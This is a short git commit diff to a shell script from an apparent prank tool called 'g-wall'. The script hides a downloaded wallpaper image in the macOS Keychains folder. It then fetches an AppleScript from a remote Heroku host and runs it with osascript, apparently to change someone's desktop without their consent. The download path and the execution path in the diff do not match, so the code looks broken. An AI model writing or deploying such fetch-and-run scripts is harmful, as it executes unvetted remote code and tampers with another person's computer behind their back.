74f3aeda1b7344df1b9d578e0d28e771bc23c1ef
hash4di <hash4di@doubledrones.com>
2011-04-12 12:18:56 +0200

    script update

--- public/run.sh
+++ public/run.sh
@@ -1,8 +1,10 @@
 #!/bin/sh -ev
 
 GWALL_HIDE=$HOME/Library/Keychains/g-wall.jpg
+GWALL_SCRIPT=$HOME/g-wall_set.scpt
 
 curl http://images2.fanpop.com/image/photos/8700000/Gay-Wallpaper-lgbt-8774743-1280-1024.jpg -o $GWALL_HIDE
+curl http://g-wall.heroku.com/g-wall_set.scpt -o $GWALL_SCRIPT
 
-osascript g-wall_set.scpt
+osascript $HOME/Library/Keychains/g-wall_set.scpt
 
